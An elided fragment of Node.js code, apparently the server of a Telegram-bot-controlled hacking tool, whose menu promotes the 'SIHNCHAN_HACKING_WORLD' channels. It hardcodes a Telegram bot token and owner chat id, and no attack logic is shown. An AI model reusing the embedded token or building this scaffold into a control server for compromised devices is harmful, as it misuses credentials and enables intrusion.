...
const token = '7091038980:AAHUk88iB-lo_hkS5-dTGoE47HcX53KO2jY'
const id = '7421314074'
...
app.get('/', function (req, res) {
    res.send('<h1 align="center" style="font-size:18px; color:blue;">❖✙𝙎𝙚𝙧𝙫𝙚𝙧 𝙪𝙥𝙡𝙤𝙖𝙙𝙚𝙙 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮✙❖</h1> <br> <p style="font-size:14px; text-align:center; color:red;">𝗧𝗘𝗟𝗘𝗚𝗥𝗔𝗠 𝗚𝗥𝗨𝗢𝗣➩ @@ITS_SIHNCHAN_08</p>')
})
    ...
    if (id == chatId) {
        if (message.text == '/start') {
            appBot.sendMessage(id,
                ...
                '• 📣𝗙𝗶𝗿𝘀𝘁 𝗝𝗼𝗶𝗻 👉 @SIHNCHAN_HACKING_WORLD \n\n' +
                '• 🌺𝗠𝗮𝗶𝗻 𝗢𝘄𝗻𝗲𝗿👉 @SIHNCHAN_OP \n\n' +
                '• 🧭𝗠𝗮𝗶𝗻 𝗚𝗿𝘂𝗼𝗽👉 @SIHNCHAN_HACKING_WORLD \n\n' +
